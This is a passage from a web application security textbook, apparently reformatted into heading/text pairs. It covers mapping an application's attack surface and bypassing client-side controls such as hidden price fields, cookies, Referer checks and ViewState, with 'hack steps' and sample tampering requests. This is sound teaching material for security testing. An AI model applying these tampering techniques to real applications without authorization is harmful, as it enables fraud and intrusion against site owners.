vulner-\nabilities that may be exploited to advance an attack (see Chapter 18).\n9. Review your map of application URLs to identify any interesting-looking\nfile extensions, directories, or other sub-sequences that may provide clues\nabout the technologies in use on the server.\n10. Review the names of all session tokens issued by the application to iden-\ntify the technologies being used.\n11. Use lists of common technologies, or Google, to establish which technolo-\ngies may be in use on the server, or discover other websites and applica-\ntions that appear to employ the same technologies.\n12. Perform searches on Google for the names of any unusual cookies,\nscripts, HTTP headers, and the like that may belong to third-party software\ncomponents. If you locate other applications in which the same compo-\nnents are being used, review these to identify any additional functionality\nand parameters that the components support, and verify whether these\nare also present in your target application. Note that third-party compo-\nnents may look and feel quite different in each implementation, due to\nbranding customizations, but the core functionality, including script and\nparameter names, is often the same. If possible, download and install the\ncomponent and analyze it to fully understand its capabilities and, if pos-\nsible, discover any vulnerabilities. Consult repositories of known vulner-\nabilities to identify any known defects with the component in question.\ncc0044..iinndddd 110066 88//1199//22001111 1122::0044::4466 PPMM"
  },
  {
    "input": "Identifying Server-Side Functionality",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 107\nChapter 4 n Mapping the Application 107\nIdentifying Server-Side Functionality\nIt is often possible to infer a great deal about server-side functionality and struc-\nture, or at least make an educated guess, by observing clues that the application\ndiscloses to the client.\nDissecting Requests\nConsider the following URL, which is used to access a search function:\nhttps://wahh-app.com/calendar.jsp?name=new%20applicants&isExpired=\n0&startDate=22%2F09%2F2010&endDate=22%2F03%2F2011&OrderBy=name\nAs you have seen, the .jsp fi le extension indicates that Java Server Pages are\nin use. You may guess that a search function will retrieve its information from\neither an indexing system or a database. The presence of the OrderBy parameter\nsuggests that a back-end database is being used and that the value you submit\nmay be used as the ORDER BY clause of a SQL query. This parameter may well\nbe vulnerable to SQL injection, as may any of the other parameters if they are\nused in database queries (see Chapter 9).\nAlso of interest among the other parameters is the isExpired fi eld. This\nappears to be a Boolean fl ag specifying whether the search query should include\nexpired content. If the application designers did not expect ordinary users to\nbe able retrieve any expired content, changing this parameter from 0 to 1 could\nidentify an access control vulnerability (see Chapter 8).\nThe following URL, which allows users to access a content management\nsystem, contains a different set of clues:\nhttps://wahh-app.com/workbench.aspx?template=NewBranch.tpl&loc=\n/default&ver=2.31&edit=false\nHere, the .aspx fi le extension indicates that this is an ASP.NET application. It also\nappears highly likely that the template parameter is used to specify a fi lename,\nand the loc parameter is used to specify a directory. The possible fi le extension\n.tpl appears to confi rm this, as does the location /default, which could very\nwell be a directory name. It is possible that the application retrieves the template\nfi le specifi ed and includes the contents in its response. These parameters may\nwell be vulnerable to path traversal attacks, allowing arbitrary fi les to be read\nfrom the server (see Chapter 10).\nAlso of interest is the edit parameter, which is set to false. It may be that\nchanging this value to true will modify the registration functionality, poten-\ntially enabling an attacker to edit items that the application developer did not\nintend to be editable. The ver parameter does not have any readily guessable\npurpose, but it may be that modifying this will cause the application to perform\na different set of functions that an attacker could exploit.\ncc0044..iinndddd 110077 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 108\n108 Chapter 4 n Mapping the Application\nFinally, consider the following request, which is used to submit a question\nto application administrators:\nPOST /feedback.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 389\nfrom=user@wahh-mail.com&to=helpdesk@wahh-app.com&subject=\nProblem+logging+in&message=Please+help...\nAs with the other examples, the .php fi le extension indicates that the function\nis implemented using the PHP language. Also, it is extremely likely that the\napplication is interfacing with an external e-mail system, and it appears that\nuser-controllable input is being passed to that system in all relevant fi elds of\nthe e-mail. The function may be exploitable to send arbitrary messages to any\nrecipient, and any of the fi elds may also be vulnerable to e-mail header injec-\ntion (see Chapter 10).\nTIP It is often necessary to consider the whole URL and application context\nto guess the function of different parts of a request. Recall the following URL\nfrom the Extreme Internet Shopping application:\nhttp://eis/pub/media/117/view\nThe handling of this URL is probably functionally equivalent to the\nfollowing:\nhttp://eis/manager?schema=pub&type=media&id=117&action=view\nWhile it isn’t certain, it seems likely that resource 117 is contained in the\ncollection of resources media and that the application is performing an action\non this resource that is equivalent to view. Inspecting other URLs would help\nconfi rm this.\nThe fi rst consideration would be to change the action from view to a possi-\nble alternative, such as edit or add. However, if you change it to add and this\nguess is right, it would likely correspond to an attempt to add a resource with\nan id of 117. This will probably fail, since there is already a resource with an\nid of 117. The best approach would be to look for an add operation with an\nid value higher than the highest observed value or to select an arbitrary high\nvalue. For example, you could request the following:\nhttp://eis/pub/media/7337/add\nIt may also be worthwhile to look for other data collections by altering\nmedia while keeping a similar URL structure:\nhttp://eis/pub/pages/1/view\nhttp://eis/pub/users/1/view\ncc0044..iinndddd 110088 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 109\nChapter 4 n Mapping the Application 109\nHACK STEPS\n1. Review the names and values of all parameters being submitted to the\napplication in the context of the functionality they support.\n2. Try to think like a programmer, and imagine what server-side mechanisms\nand technologies are likely to have been used to implement the behavior\nyou can observe.\nExtrapolating Application Behavior\nOften, an application behaves consistently across the range of its functionality.\nThis may be because different functions were written by the same developer\nor to the same design specifi cation, or share some common code components.\nIn this situation, it may be possible to draw conclusions about server-side func-\ntionality in one area and extrapolate these to another area.\nFor example, the application may enforce some global input validation checks,\nsuch as sanitizing various kinds of potentially malicious input before it is pro-\ncessed. Having identifi ed a blind SQL injection vulnerability, you may encounter\nproblems exploiting it, because your crafted requests are being modifi ed in\nunseen ways by the input validation logic. However, other functions within the\napplication might provide good feedback about the kind of sanitization being\nperformed — for example, a function that echoes some user-supplied data to\nthe browser. You may be able to use this function to test different encodings and\nvariations of your SQL injection payload to determine what raw input must be\nsubmitted to achieve the desired attack string after the input validation logic\nhas been applied. If you are lucky, the validation works in the same way across\nthe application, enabling you to exploit the injection fl aw.\nSome applications use custom obfuscation schemes when storing sensitive\ndata on the client to prevent casual inspection and modifi cation of this data\nby users (see Chapter 5). Some such schemes may be extremely diffi cult to\ndecipher given access to only a sample of obfuscated data. However, there may\nbe functions within the application where a user can supply an obfuscated\nstring and retrieve the original. For example, an error message may include the\ndeobfuscated data that led to the error. If the same obfuscation scheme is used\nthroughout the application, it may be possible to take an obfuscated string from\none location (such as a cookie) and feed it into the other function to decipher its\nmeaning. It may also be possible to reverse-engineer the obfuscation scheme by\nsubmitting systematically varying values to the function and monitoring their\ndeobfuscated equivalents.\nFinally, errors are often handled inconsistently within the application. Some\nareas trap and handle errors gracefully, and other areas simply crash and return\ncc0044..iinndddd 110099 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 110\n110 Chapter 4 n Mapping the Application\nverbose debugging information to the user (see Chapter 15). In this situation,\nit may be possible to gather information from the error messages returned in\none area and apply it to other areas where errors are handled gracefully. For\nexample, by manipulating request parameters in systematic ways and monitor-\ning the error messages received, it may be possible to determine the internal\nstructure and logic of the application component. If you are lucky, aspects of\nthis structure may be replicated in other areas.\nHACK STEPS\n1. Try to identify any locations within the application that may contain clues\nabout the internal structure and functionality of other areas.\n2. It may not be possible to draw any firm conclusions here; however, the\ncases identified may prove useful at a later stage of the attack when\nyou’re attempting to exploit any potential vulnerabilities.\nIsolating Unique Application Behavior\nSometimes the situation is the opposite of that just described. In many well-\nsecured or mature applications, a consistent framework is employed that pre-\nvents numerous types of attacks, such as cross-site scripting, SQL injection,\nand unauthorized access. In these cases, the most fruitful areas for hunting\nvulnerabilities generally are the portions of the application that have been added\nretrospectively, or “bolted on,” and hence are not handled by the application’s\ngeneral security framework. Additionally, they may not be correctly tied into\nthe application through authentication, session management, and access control.\nThese are often identifi able through differences in GUI appearance, parameter\nnaming conventions, or explicitly through comments in source code.\nHACK STEPS\n1. Make a note of any functionality that diverges from the standard GUI\nappearance, parameter naming, or navigation mechanism used within the\nrest of the application.\n2. Also make a note of functionality that is likely to have been added retro-\nspectively. Examples include debug functions, CAPTCHA controls, usage\ntracking, and third-party code.\n3. Perform a full review of these areas, and do not assume that the standard\ndefenses used elsewhere in the application apply.\ncc0044..iinndddd 111100 88//1199//22001111 1122::0044::4466 PPMM"
  },
  {
    "input": "Mapping the Attack Surface",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 111\nChapter 4 n Mapping the Application 111\nMapping the Attack Surface\nThe fi nal stage of the mapping process is to identify the various attack surfaces\nexposed by the application and the potential vulnerabilities that are commonly\nassociated with each one. The following is a rough guide to some key types\nof behavior and functionality that you may identify, and the kinds of vulner-\nabilities that are most commonly found within each one. The remainder of this\nbook is concerned with the practical details of how you can detect and exploit\neach of these problems:\nn Client-side validation — Checks may not be replicated on the server\nn Database interaction — SQL injection\nn File uploading and downloading — Path traversal vulnerabilities, stored\ncross-site scripting\nn Display of user-supplied data — Cross-site scripting\nn Dynamic redirects — Redirection and header injection attacks\nn Social networking features — username enumeration, stored cross-site\nscripting\nn Login — Username enumeration, weak passwords, ability to use brute\nforce\nn Multistage login — Logic fl aws\nn Session state — Predictable tokens, insecure handling of tokens\nn Access controls — Horizontal and vertical privilege escalation\nn User impersonation functions — Privilege escalation\nn Use of cleartext communications — Session hijacking, capture of creden-\ntials and other sensitive data\nn Off-site links — Leakage of query string parameters in the Referer\nheader\nn Interfaces to external systems — Shortcuts in the handling of sessions\nand/or access controls\nn Error messages — Information leakage\nn E-mail interaction — E-mail and/or command injection\nn Native code components or interaction — Buffer overfl ows\nn Use of third-party application components — Known vulnerabilities\nn Identifi able web server software — Common confi guration weaknesses,\nknown software bugs\ncc0044..iinndddd 111111 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 112\n112 Chapter 4 n Mapping the Application\nMapping the Extreme Internet Shopping Application\nHaving mapped the content and functionality of the EIS application, many paths\ncould be followed to attack the application, as shown in Figure 4-15.\nFigure 4-15: The attack surface exposed by the EIS application\nThe /auth directory contains authentication functionality. A full review of\nall authentication functions, session handling, and access control is worthwhile,\nincluding further content discovery attacks.\nWithin the /core path, the sitestats page appears to accept an array of param-\neters delimited by the pipe character (|). As well as conventional input-based\nattacks, other values could be brute-forcible, such as source, location, and\nIP, in an attempt to reveal more information about other users or about the\npage specifi ed in pageID. It may also be possible to fi nd out information about\ncc0044..iinndddd 111122 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 113\nChapter 4 n Mapping the Application 113\ninaccessible resources or to try a wildcard option in pageID, such as pageID=all\nor pageID=*. Finally, because the observed pageID value contains a slash, it may\nindicate a resource being retrieved from the fi le system, in which case path\ntraversal attacks may be a possibility.\nThe /gb path contains the site’s guestbook. Visiting this page suggests it is\nused as a discussion forum, moderated by an administrator. Messages are mod-\nerated, but the login bypass login=true means that an attacker can attempt to\napprove malicious messages (to deliver cross-site scripting attacks, for example)\nand read other users’ private messages to the administrator.\nThe /home path appears to hold authenticated user content. This could make\na good basis for attempts to launch a horizontal privilege escalation attack to\naccess another user’s personal information and to ensure that access controls\nare present and enforced on every page.\nA quick review shows that the /icons and /images paths hold static content.\nIt may be worth brute-forcing for icon names that could indicate third-party\nsoftware, and checking for directory indexing on these directories, but they are\nunlikely to be worth signifi cant effort.\nThe /pub path contains REST-style resources under /pub/media and /pub/\nuser. A brute-force attack could be used to fi nd the profi le pages of other appli-\ncation users by targeting the numeric value in /pub/user/11. Social networking\nfunctionality such as this can reveal user information, usernames, and other\nusers’ logon status.\nThe /shop path contains the online shopping site and has a large number of\nURLs. However, they all have a similar structure, and an attacker could probably\nprobe all of the relevant attack surface by looking at just one or two items. The\npurchasing process may contain interesting logic fl aws that could be exploited\nto obtain unauthorized discounts or avoid payment.\nHACK STEPS\n1. Understand the core functionality implemented within the application and\nthe main security mechanisms in use.\n2. Identify all features of the application’s functionality and behavior that\nare often associated with common vulnerabilities.\n3. Check any third-party code against public vulnerability databases such as\nwww.osvdb.org to determine any known issues.\n4. Formulate a plan of attack, prioritizing the most interesting-looking func-\ntionality and the most serious of the associated potential vulnerabilities.\ncc0044..iinndddd 111133 88//1199//22001111 1122::0044::4466 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c04.indd V3 - 07/22/2011 Page 114\n114 Chapter 4 n Mapping the Application\nSummary\nMapping the application is a key prerequisite to attacking it. It may be tempting\nto dive in and start probing for bugs, but taking time to gain a sound under-\nstanding of the application’s functionality, technologies, and attack surface will\npay dividends down the line.\nAs with almost all of web application hacking, the most effective approach\nis to use manual techniques supplemented where appropriate by controlled\nautomation. No fully automated tool can carry out a thorough mapping of the\napplication in a safe way. To do this, you need to use your hands and draw on\nyour own experience. The core methodology we have outlined involves the\nfollowing:\nn Manual browsing and user-directed spidering to enumerate the applica-\ntion’s visible content and functionality\nn Use of brute force combined with human inference and intuition to dis-\ncover as much hidden content as possible\nn An intelligent analysis of the application to identify its key functionality,\nbehavior, security mechanisms, and technologies\nn An assessment of the application’s attack surface, highlighting the most\npromising functions and behavior for more focused probing into exploit-\nable vulnerabilities\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. While mapping an application, you encounter the following URL:\nhttps://wahh-app.com/CookieAuth.dll?GetLogon?curl=Z2Fdefault.\naspx\nWhat information can you deduce about the technologies employed on\nthe server and how it is likely to behave?\n2. The application you are targeting implements web forum functionality.\nHere is the only URL you have discovered:\nhttp://wahh-app.com/forums/ucp.php?mode=register\nHow might you obtain a listing of forum members?\ncc0044..iinndddd 111144 88//1199//22001111 1122::0044::4466 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 115\nChapter 4 n Mapping the Application 115\n3. While mapping an application, you encounter the following URL:\nhttps://wahh-app.com/public/profile/Address.\nasp?action=view&location\n=default\nWhat information can you infer about server-side technologies? What\ncan you conjecture about other content and functionality that may exist?\n4. A web server’s responses include the following header:\nServer: Apache-Coyote/1.1\nWhat does this indicate about the technologies in use on the server?\n5. You are mapping two different web applications, and you request the URL\n/admin.cpf from each application. The response headers returned by each\nrequest are shown here. From these headers alone, what can you deduce\nabout the presence of the requested resource within each application?\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.0\nExpires: Mon, 20 Jun 2011 14:59:21 GMT\nContent-Location: http://wahh-\napp.com/includes/error.htm?404;http://wahh-app.com/admin.cpf\nDate: Mon, 20 Jun 2011 14:59:21 GMT\nContent-Type: text/html\nAccept-Ranges: bytes\nContent-Length: 2117\nHTTP/1.1 401 Unauthorized\nServer: Apache-Coyote/1.1\nWWW-Authenticate: Basic realm=”Wahh Administration Site”\nContent-Type: text/html;charset=utf-8\nContent-Length: 954\nDate: Mon, 20 Jun 2011 15:07:27 GMT\nConnection: close\ncc0044..iinndddd 111155 88//1199//22001111 1122::0044::4477 PPMM\nStuttard c04.indd V3 - 07/22/2011 Page 116\ncc0044..iinndddd 111166 88//1199//22001111 1122::0044::4477 PPMM"
  },
  {
    "input": "Chapter 5 Bypassing Client-Side Controls",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 117\nCHAPTER\n5\nBypassing Client-Side Controls\nChapter 1 described how the core security problem with web applications arises\nbecause clients can submit arbitrary input. Despite this fact, a large proportion\nof web applications, nevertheless, rely on various measures implemented on\nthe client side to control the data that they submit to the server. In general, this\nrepresents a fundamental security fl aw: the user has full control over the client\nand the data it submits and can bypass any controls that are implemented on\nthe client side and are not replicated on the server.\nAn application may rely on client-side controls to restrict user input in two\nbroad ways. First, an application may transmit data via the client component\nusing a mechanism that it assumes will prevent the user from modifying that\ndata when the application later reads it. Second, an application may implement\nmeasures on the client side that control the user’s interaction with his or her\nown client, with the aim of restricting functionality and/or applying controls\naround user input before it is submitted. This may be achieved using HTML\nform features, client-side scripts, or browser extension technologies.\nThis chapter looks at examples of each kind of client-side control and describes\nways in which they can be bypassed.\n117\ncc0055..iinndddd 111177 88//1199//22001111 1122::0055::4400 PPMM"
  },
  {
    "input": "Hidden Form Fields",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 118\n118 Chapter 5 n Bypassing Client-Side Controls\nTransmitting Data Via the Client\nIt is common to see an application passing data to the client in a form that the\nend user cannot directly see or modify, with the expectation that this data\nwill be sent back to the server in a subsequent request. Often, the application’s\ndevelopers simply assume that the transmission mechanism used will ensure\nthat the data transmitted via the client will not be modifi ed along the way.\nBecause everything submitted from the client to the server is within the\nuser’s control, the assumption that data transmitted via the client will not be\nmodifi ed is usually false and often leaves the application vulnerable to one or\nmore attacks.\nYou may reasonably wonder why, if the server knows and specifi es a particular\nitem of data, the application would ever need to transmit this value to the client\nand then read it back. In fact, writing applications in this way is often easier for\ndevelopers for various reasons:\nn It removes the need to keep track of all kinds of data within the user’s\nsession. Reducing the amount of per-session data being stored on the\nserver can also improve the application’s performance.\nn If the application is deployed on several distinct servers, with users poten-\ntially interacting with more than one server to perform a multistep action,\nit may not be straightforward to share server-side data between the hosts\nthat may handle the same user’s requests. Using the client to transmit data\ncan be a tempting solution to the problem.\nn If the application employs any third-party components on the server,\nsuch as shopping carts, modifying these may be diffi cult or impossible, so\ntransmitting data via the client may be the easiest way of integrating these.\nn In some situations, tracking a new piece of data on the server may entail\nupdating a core server-side API, thereby triggering a full-blown formal\nchange-management process and regression testing. Implementing a more\npiecemeal solution involving client-side data transmission may avoid this,\nallowing tight deadlines to be met.\nHowever, transmitting sensitive data in this way is usually unsafe and has\nbeen the cause of countless vulnerabilities in applications.\nHidden Form Fields\nHidden HTML form fi elds are a common mechanism for transmitting data via\nthe client in a superfi cially unmodifi able way. If a fi eld is fl agged as hidden,\nit is not displayed on-screen. However, the fi eld’s name and value are stored\nwithin the form and are sent back to the application when the user submits\nthe form.\ncc0055..iinndddd 111188 88//1199//22001111 1122::0055::4400 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 119\nChapter 5 n Bypassing Client-Side Controls 119\nThe classic example of this security fl aw is a retailing application that stores\nthe prices of products within hidden form fi elds. In the early days of web appli-\ncations, this vulnerability was extremely widespread, and by no means has it\nbeen eliminated today. Figure 5-1 shows a typical form.\nFigure 5-1: A typical HTML form\nThe code behind this form is as follows:\n<form method=”post” action=”Shop.aspx?prod=1”>\nProduct: iPhone 5 <br/>\nPrice: 449 <br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”hidden” name=”price” value=”449”>\n<input type=”submit” value=”Buy”>\n</form>\nNotice the form fi eld called price, which is fl agged as hidden. This fi eld is sent\nto the server when the user submits the form:\nPOST /shop/28/Shop.aspx?prod=1 HTTP/1.1\nHost: mdsec.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 20\nquantity=1&price=449\nTRY IT!\nhttp://mdsec.net/shop/28/\nAlthough the price fi eld is not displayed on-screen, and the user cannot edit\nit, this is solely because the application has instructed the browser to hide the\nfi eld. Because everything that occurs on the client side is ultimately within\nthe user’s control, this restriction can be circumvented to edit the price.\nOne way to achieve this is to save the source code for the HTML page, edit\nthe fi eld’s value, reload the source into a browser, and click the Buy button.\nHowever, an easier and more elegant method is to use an intercepting proxy to\nmodify the desired data on-the-fl y.\ncc0055..iinndddd 111199 88//1199//22001111 1122::0055::4400 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 120\n120 Chapter 5 n Bypassing Client-Side Controls\nAn intercepting proxy is tremendously useful when attacking a web applica-\ntion and is the one truly indispensable tool you need. Numerous such tools are\navailable. We will use Burp Suite, which was written by one of this book’s authors.\nThe proxy sits between your web browser and the target application. It inter-\ncepts every request issued to the application, and every response received back,\nfor both HTTP and HTTPS. It can trap any intercepted message for inspection\nor modifi cation by the user. If you haven’t used an intercepting proxy before,\nyou can read more about how they function, and how to get them confi gured\nand working, in Chapter 20.\nOnce an intercepting proxy has been installed and suitably confi gured, you\ncan trap the request that submits the form and modify the price fi eld to any\nvalue, as shown in Figure 5-2.\nFigure 5-2: Modifying the values of hidden form fields using an intercepting proxy\nIf the application processes the transaction based on the price submitted, you\ncan purchase the product for the price of your choice.\nTIP If you fi nd an application that is vulnerable in this way, see whether you\ncan submit a negative amount as the price. In some cases, applications have\nactually accepted transactions using negative prices. The attacker receives a\nrefund to his credit card and also the item he ordered — a win-win situation, if\never there was one.\ncc0055..iinndddd 112200 88//1199//22001111 1122::0055::4400 PPMM"
  },
  {
    "input": "URL Parameters",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 121\nChapter 5 n Bypassing Client-Side Controls 121\nHTTP Cookies\nAnother common mechanism for transmitting data via the client is HTTP cook-\nies. As with hidden form fi elds, normally these are not displayed on-screen, and\nthe user cannot modify them directly. They can, of course, be modifi ed using\nan intercepting proxy, by changing either the server response that sets them or\nsubsequent client requests that issue them.\nConsider the following variation on the previous example. After the customer\nhas logged in to the application, she receives the following response:\nHTTP/1.1 200 OK\nSet-Cookie: DiscountAgreed=25\nContent-Length: 1530\n...\nThis DiscountAgreed cookie points to a classic case of relying on client-side\ncontrols (the fact that cookies normally can’t be modifi ed) to protect data trans-\nmitted via the client. If the application trusts the value of the DiscountAgreed\ncookie when it is submitted back to the server, customers can obtain arbitrary\ndiscounts by modifying its value. For example:\nPOST /shop/92/Shop.aspx?prod=3 HTTP/1.1\nHost: mdsec.net\nCookie: DiscountAgreed=25\nContent-Length: 10\nquantity=1\nTRY IT!\nhttp://mdsec.net/shop/92/\nURL Parameters\nApplications frequently transmit data via the client using preset URL param-\neters. For example, when a user browses the product catalog, the application\nmay provide him with hyperlinks to URLs like the following:\nhttp://mdsec.net/shop/?prod=3&pricecode=32\nWhen a URL containing parameters is displayed in the browser’s location bar,\nany parameters can be modifi ed easily by any user without the use of tools.\nHowever, in many instances an application may expect that ordinary users\ncannot view or modify URL parameters:\nn Where embedded images are loaded using URLs containing parameters\nn Where URLs containing parameters are used to load a frame’s contents\ncc0055..iinndddd 112211 88//1199//22001111 1122::0055::4411 PPMM"
  },
  {
    "input": "The Referer Header",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 122\n122 Chapter 5 n Bypassing Client-Side Controls\nn Where a form uses the POST method and its target URL contains preset\nparameters\nn Where an application uses pop-up windows or other techniques to conceal\nthe browser location bar\nOf course, in any such case the values of any URL parameters can be modifi ed\nas previously discussed using an intercepting proxy.\nThe Referer Header\nBrowsers include the Referer header within most HTTP requests. It is used to\nindicate the URL of the page from which the current request originated — either\nbecause the user clicked a hyperlink or submitted a form, or because the page\nreferenced other resources such as images. Hence, it can be leveraged as a\nmechanism for transmitting data via the client. Because the URLs processed by\nthe application are within its control, developers may assume that the Referer\nheader can be used to reliably determine which URL generated a particular\nrequest.\nFor example, consider a mechanism that enables users to reset their password\nif they have forgotten it. The application requires users to proceed through\nseveral steps in a defi ned sequence before they actually reset their password’s\nvalue with the following request:\nGET /auth/472/CreateUser.ashx HTTP/1.1\nHost: mdsec.net\nReferer: https://mdsec.net/auth/472/Admin.ashx\nThe application may use the Referer header to verify that this request origi-\nnated from the correct stage (Admin.ashx). If it did, the user can access the\nrequested functionality.\nHowever, because the user controls every aspect of every request, including\nthe HTTP headers, this control can be easily circumvented by proceeding directly\nto CreateUser.ashx and using an intercepting proxy to change the value of the\nReferer header to the value that the application requires.\nThe Referer header is strictly optional according to w3.org standards. Hence,\nalthough most browsers implement it, using it to control application functional-\nity should be regarded as a hack.\nTRY IT!\nhttp://mdsec.net/auth/472/\ncc0055..iinndddd 112222 88//1199//22001111 1122::0055::4411 PPMM"
  },
  {
    "input": "Opaque Data",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 123\nChapter 5 n Bypassing Client-Side Controls 123\nCOMMON MYTH\nIt is often assumed that HTTP headers are somehow more “tamper-proof”\nthan other parts of the request, such as the URL. This may lead developers to\nimplement functionality that trusts the values submitted in headers such as\nCookie and Referer while performing proper validation of other data such\nas URL parameters. However, this perception is false. Given the multitude of\nintercepting proxy tools that are freely available, any amateur hacker who\ntargets an application can change all request data with ease. It is rather like\nsupposing that when the teacher comes to search your desk, it is safer to hide\nyour water pistol in the bottom drawer, because she will need to bend down\nfarther to discover it.\nHACK STEPS\n1. Locate all instances within the application where hidden form fields,\ncookies, and URL parameters are apparently being used to transmit data\nvia the client.\n2. Attempt to determine or guess the role that the item plays in the applica-\ntion’s logic, based on the context in which it appears and on clues such as\nthe parameter’s name.\n3. Modify the item’s value in ways that are relevant to its purpose in the\napplication. Ascertain whether the application processes arbitrary values\nsubmitted in the parameter, and whether this exposes the application to\nany vulnerabilities.\nOpaque Data\nSometimes, data transmitted via the client is not transparently intelligible\nbecause it has been encrypted or obfuscated in some way. For example, instead\nof seeing a product’s price stored in a hidden fi eld, you may see a cryptic value\nbeing transmitted:\n<form method=”post” action=”Shop.aspx?prod=4”>\nProduct: Nokia Infinity <br/>\nPrice: 699 <br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”hidden” name=”price” value=”699”>\n<input type=”hidden” name=”pricing_token”\nvalue=”E76D213D291B8F216D694A34383150265C989229”>\n<input type=”submit” value=”Buy”>\n</form>\ncc0055..iinndddd 112233 88//1199//22001111 1122::0055::4411 PPMM"
  },
  {
    "input": "The ASP.NET ViewState",
    "output": "Stuttard c05.indd V3 - 07/22/2011 Page 124\n124 Chapter 5 n Bypassing Client-Side Controls\nWhen this is observed, you may reasonably infer that when the form is sub-\nmitted, the server-side application checks the integrity of the opaque string, or\neven decrypts or deobfuscates it to perform some processing on its plaintext\nvalue. This further processing may be vulnerable to any kind of bug. However, to\nprobe for and exploit this, fi rst you need to wrap up your payload appropriately.\nTRY IT!\nhttp://mdsec.net/shop/48/\nNOTE Opaque data items transmitted via the client are often part of the\napplication’s session-handling mechanism. Session tokens sent in HTTP cook-\nies, anti-CSRF tokens transmitted in hidden fi elds, and one-time URL tokens\nfor accessing application resources, are all potential targets for client-side\ntampering. Numerous considerations are specifi c to these kinds of tokens, as\ndiscussed in depth in Chapter 7.\nHACK STEPS\nFaced with opaque data being transmitted via the client, several avenues of\nattack are possible:\n1. If you know the value of the plaintext behind the opaque string, you can\nattempt to decipher the obfuscation algorithm being employed.\n2. As described in Chapter 4, the application may contain functions else-\nwhere that you can leverage to return the opaque string resulting from a\npiece of plaintext you control. In this situation, you may be able to directly\nobtain the required string to deliver an arbitrary payload to the function\nyou are targeting.\n3. Even if the opaque string is impenetrable, it may be possible to replay\nits value in other contexts to achieve a malicious effect. For example, the\npricing_token parameter in the previously shown form may contain\nan encrypted version of the product’s price. Although it is not possible to\nproduce the encrypted equivalent for an arbitrary price of your choosing,\nyou may be able to copy the encrypted price from a different, cheaper\nproduct and submit this in its place.\n4. If all else fails, you can attempt to attack the server-side logic that will\ndecrypt or deobfuscate the opaque string by submitting malformed varia-\ntions of it — for example, containing overlong values, different character\nsets, and the like.\nThe ASP.NET ViewState\nOne commonly encountered mechanism for transmitting opaque data via the\nclient is the ASP.NET ViewState. This is a hidden fi eld that is created by default\nin all ASP.NET web applications. It contains serialized information about the\ncc0055..iinndddd 112244 88//1199//22001111 1122::0055::4411 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 125\nChapter 5 n Bypassing Client-Side Controls 125\nstate of the current page. The ASP.NET platform employs the ViewState to\nenhance server performance. It enables the server to preserve elements within\nthe user interface across successive requests without needing to maintain all\nthe relevant state information on the server side. For example, the server may\npopulate a drop-down list on the basis of parameters submitted by the user.\nWhen the user makes subsequent requests, the browser does not submit the\ncontents of the list back to the server. However, the browser does submit the\nhidden ViewState fi eld, which contains a serialized form of the list. The server\ndeserializes the ViewState and recreates the same list that is presented to the\nuser again.\nIn addition to this core purpose of the ViewState, developers can use it to\nstore arbitrary information across successive requests. For example, instead of\nsaving the product’s price in a hidden form fi eld, an application may save it in\nthe ViewState as follows:\nstring price = getPrice(prodno);\nViewState.Add(“price”, price);\nThe form returned to the user now looks something like this:\n<form method=”post” action=”Shop.aspx?prod=3”>\n<input type=”hidden” name=”__VIEWSTATE” id=”__VIEWSTATE”\nvalue=”/wEPDwULLTE1ODcxNjkwNjIPFgIeBXByaWNlBQMzOTlkZA==” />\nProduct: HTC Avalanche <br/>\nPrice: 399 <br/>\nQuantity: <input type=”text” name=”quantity”> (Maximum quantity is 50)\n<br/>\n<input type=”submit” value=”Buy”>\n</form>\nWhen the user submits the form, her browser sends the following:\nPOST /shop/76/Shop.aspx?prod=3 HTTP/1.1\nHost: mdsec.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 77\n__VIEWSTATE=%2FwEPDwULLTE1ODcxNjkwNjIPFgIeBXByaWNlBQMzOTlkZA%3D%3D&\nquantity=1\nThe request apparently does not contain the product price — only the quan-\ntity ordered and the opaque ViewState parameter. Changing that parameter at\nrandom results in an error message, and the purchase is not processed.\nThe ViewState parameter is actually a Base64-encoded string that can be\neasily decoded to see the price parameter that has been placed there:\n3D FF 01 0F 0F 05 0B 2D 31 35 38 37 31 36 39 30 ; =ÿ.....-15871690\n36 32 0F 16 02 1E 05 70 72 69 63 65 05 03 33 39 ; 62.....price..39\n39 64 64 ; 9dd\ncc0055..iinndddd 112255 88//1199//22001111 1122::0055::4411 PPMM\nStuttard c05.indd V3 - 07/22/2011 Page 126\n126 Chapter 5 n Bypassing Client-Side Controls\nTIP When you attempt to decode what appears to be a Base64-encoded\nstring, a common mistake is to begin decoding at the wrong position within the\nstring. Because of how Base64 encoding works, if you start at the wrong posi-\ntion, the decoded string will contain gibberish. Base64 is a block-based format\nin which every 4 bytes of encoded data translates into 3 bytes of decoded data.\nHence, if your attempts to decode a Base64 string do not uncover anything\nmeaningful, try starting from four adjacent offsets into the encoded string.\nBy default, the ASP.NET platform protects the ViewState from tampering by\nadding a keyed hash to it (known as MAC protection). However, some applications\ndisable this default protection, meaning that you can modify the ViewState’s value\nto determine whether it has an effect on the application’s server-side processing.\nBurp Suite includes a ViewState parser that indicates whether the ViewState\nis MAC protected, as shown in Figure 5-3. If it is not protected, you can edit the\ncontents of the ViewState within Burp using the hex editor below the 